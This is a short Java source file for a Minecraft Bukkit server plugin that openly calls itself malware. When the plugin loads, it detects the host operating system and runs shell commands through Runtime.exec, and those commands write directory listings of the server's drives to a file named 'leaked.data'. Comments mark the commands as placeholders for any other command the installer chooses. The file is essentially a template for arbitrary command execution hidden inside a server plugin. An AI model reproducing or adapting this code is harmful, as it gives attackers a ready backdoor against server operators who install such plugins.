package malicious.serverattack;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;

public final class Serverattack extends JavaPlugin {
    @Override
    public void onEnable() {getLogger().info("Malware started");
        send_command(detect_os());

    }

    String detect_os() {String sysprop =
            System.getProperty("os.name").toLowerCase();

        if (sysprop.contains("win")) {
            //"cmd /c " and your command

            return "cmd /c dir C: > leaked.data";

        }else if(sysprop.contains("nix") || sysprop.contains("nux") || sysprop.contains("aix")){
            //shell command

            return "ls / > leaked.data";

        }else if(sysprop.contains("mac")){
            //shell command

            return "ls /home > leaked.data";

        }else if(sysprop.contains("sunos")){
            //shell command

            return "ls > leaked.data";

        }
        return "compatibility";
    }

    void send_command(String exec){
        if(exec.equals("compatibility")){// your compatibility code

             }try { Runtime.getRuntime().exec(exec); } catch (IOException e) {}
    }
}
